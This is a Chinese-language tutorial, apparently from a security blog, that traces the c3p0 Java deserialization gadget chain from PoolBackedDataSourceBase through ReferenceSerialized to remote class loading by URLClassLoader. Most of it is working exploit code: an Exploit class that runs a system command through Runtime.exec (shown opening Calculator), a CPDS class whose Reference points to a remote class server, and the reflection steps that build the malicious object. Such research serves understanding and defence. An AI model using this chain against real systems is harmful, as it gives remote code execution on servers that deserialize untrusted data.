这个链还是比较简单的，调用过程很短。

需要先了解URLClassLoader，简单写个demo看下：
```java
import java.net.URL;
import java.net.URLClassLoader;

public class urlClassloader {
    public static void main(String[] args) throws Exception{
        URL url = new URL("http://127.0.0.1:8080/");
        ClassLoader urlclassloader = new URLClassLoader(new URL[]{url}, Thread.currentThread().getContextClassLoader());

        Class exploit = Class.forName("Exploit", true, urlclassloader);  // 通过URLClassLoader获取类，并实例化
        Object exp = exploit.newInstance();
    }
}
```
我们可以写一个Exploit利用类：
```java
import java.io.IOException;

public class Exploit {
    public Exploit() throws IOException{
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }
}
```
然后javac编译，并启动python http服务：
```sh
javac Exploit.java

python3 -m http.server
```
然后运行上面的urlClassloader类的main方法，即可弹计算器。

---

先了解下，connectionPoolDataSource是PoolBackedDataSourceBase类的一个私有属性
```java
private ConnectionPoolDataSource connectionPoolDataSource;
```

看下PoolBackedDataSourceBase的writeObject方法：
```java
private void writeObject(ObjectOutputStream oos) throws IOException {
    oos.writeShort(1); // 设置version

    ReferenceIndirector indirector;
    try { //尝试写序列化this.connectionPoolDataSource
        SerializableUtils.toByteArray(this.connectionPoolDataSource);
        oos.writeObject(this.connectionPoolDataSource);
    } catch (NotSerializableException var9) { // 如果失败，进来
        MLog.getLogger(this.getClass()).log(MLevel.FINE, "Direct serialization provoked a NotSerializableException! Trying indirect.", var9);

        try {  // 用ReferenceIndirector.indirectorForm来处理this.connectionPoolDataSource，再写序列化
            indirector = new ReferenceIndirector();
            oos.writeObject(indirector.indirectForm(this.connectionPoolDataSource));
        } catch (IOException var7) {
            throw var7;
        } catch (Exception var8) {
            throw new IOException("Problem indirectly serializing connectionPoolDataSource: " + var8.toString());
        }
    }
    .....
}
```
我们跟进ReferenceIndirector.indirectorForm：
```java
public IndirectlySerialized indirectForm(Object var1) throws Exception {
    Reference var2 = ((Referenceable)var1).getReference();  // 强制类型转换，调用其getRerference方法
    return new ReferenceSerialized(var2, this.name, this.contextName, this.environmentProperties);  // 实例化一个ReferenceSerialized
}
```
跟进ReferenceSerialized：
```java
private static class ReferenceSerialized implements IndirectlySerialized {
    Reference reference;
    Name name;
    Name contextName;
    Hashtable env;

    ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) {
        this.reference = var1;
        this.name = var2;
        this.contextName = var3;
        this.env = var4;
    }
    ....
}
```
看到这里，我们可以注意到，如果我们写一个类实现了Referenceable接口，然后重写getRerence方法，再用这个类实例作为connectionPoolDataSource，在序列化时，ReferenceSerialized的this.reference就是受我们控制的。

---

接下来看PoolBackedDataSourceBase的readObject方法：
```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    short version = ois.readShort();
    switch (version) {
        case 1:
            Object o = ois.readObject();
            if (o instanceof IndirectlySerialized) {  // 判断类型，如果是IndirectlySerialized的实例，则调用其getObject方法
                o = ((IndirectlySerialized)o).getObject();
            }
        ...
    }
}
```
由于IndirectlySerialized是个接口，只有一个实现类ReferenceSerialized（上面已经讨论过他的实例化了），跟进：
```java
private static class ReferenceSerialized implements IndirectlySerialized {
    Reference reference;  // 这是我们可控的
    Name name;
    Name contextName;
    Hashtable env;

    ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) {
        this.reference = var1;
        this.name = var2;
        this.contextName = var3;
        this.env = var4;
    }

    public Object getObject() throws ClassNotFoundException, IOException {
        try {
            InitialContext var1;
            if (this.env == null) {
                var1 = new InitialContext();
            } else {
                var1 = new InitialContext(this.env);
            }

            Context var2 = null;
            if (this.contextName != null) {
                var2 = (Context)var1.lookup(this.contextName);  // this.contextName不可控，因此无法造成jndi注入
            }

            return ReferenceableUtils.referenceToObject(this.reference, this.name, var2, this.env); // 跟进
        } catch (NamingException var3) {
            if (ReferenceIndirector.logger.isLoggable(MLevel.WARNING)) {
                ReferenceIndirector.logger.log(MLevel.WARNING, "Failed to acquire the Context necessary to lookup an Object.", var3);
            }

            throw new InvalidObjectException("Failed to acquire the Context necessary to lookup an Object: " + var3.toString());
        }
    }
}
```
跟进ReferenceableUtils.referenceToObject：
```java
public static Object referenceToObject(Reference var0, Name var1, Context var2, Hashtable var3) throws NamingException {
    try {
        String var4 = var0.getFactoryClassName();
        String var11 = var0.getFactoryClassLocation();  // var0可控，从var0获取类型以及路径
        ClassLoader var6 = Thread.currentThread().getContextClassLoader();
        if (var6 == null) {
            var6 = ReferenceableUtils.class.getClassLoader();
        }

        Object var7;
        if (var11 == null) {
            var7 = var6;
        } else {
            URL var8 = new URL(var11);
            var7 = new URLClassLoader(new URL[]{var8}, var6);
        }

        Class var12 = Class.forName(var4, true, (ClassLoader)var7);  // 通过URLClassLoader获取类，并实例化
        ObjectFactory var9 = (ObjectFactory)var12.newInstance();
        return var9.getObjectInstance(var0, var1, var2, var3);  // 试图调用Factory的getObjectInstance
    }
    ...
}
```

考虑到connectionPoolDataSource是ConnectionPoolDataSource类型，因此我们需要实现一个类，同时实现ConnectionPoolDataSource与Referenceable两个接口：
```java
public class CPDS implements ConnectionPoolDataSource, Referenceable {

    @Override
    public Reference getReference() throws NamingException {
        return new Reference("Exploit", "Exploit", "http://127.0.0.1:8000/");
    }

    @Override
    public PooledConnection getPooledConnection() throws SQLException {
        return null;
    }

    @Override
    public PooledConnection getPooledConnection(String user, String password) throws SQLException {
        return null;
    }

    @Override
    public PrintWriter getLogWriter() throws SQLException {
        return null;
    }

    @Override
    public void setLogWriter(PrintWriter out) throws SQLException {

    }

    @Override
    public void setLoginTimeout(int seconds) throws SQLException {

    }

    @Override
    public int getLoginTimeout() throws SQLException {
        return 0;
    }

    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        return null;
    }
}
```
大部分方法都是实现接口必须写的，只有getReference我们需要重写，设定classname、factory、factoryLocation。

然后new一个PoolBackedDataSourceBase实例，通过反射修改其connectionPoolDataSource。
```java
PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
Field connectionPoolDataSource = poolBackedDataSourceBase.getClass().getDeclaredField("connectionPoolDataSource");
connectionPoolDataSource.setAccessible(true);
connectionPoolDataSource.set(poolBackedDataSourceBase,new CPDS());
```
到这里就构造好了。
在序列化时，其调用链为：
```java
PoolBackedDataSourceBase.writeObject()
    -> ReferenceIndirector.indirectForm(this.connectionPoolDataSource) -> CPDS.getReference() // 这是我们改的方法
    -> new ReferenceSerialized() -> 设置this.reference
```

反序列化时的调用链：
```java
ObjectInputStream.readObject() 
    -> com.mchange.v3.c3p0.impl.PoolBackedDataSourceBase.readObject()
    -> IndirectlySerialized.getObject() -> com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized.getObject()
        -> ReferenceAbleUtils.referenceToObject() -> Class.forName(xxxclass) && xxxclass.newInstance()
```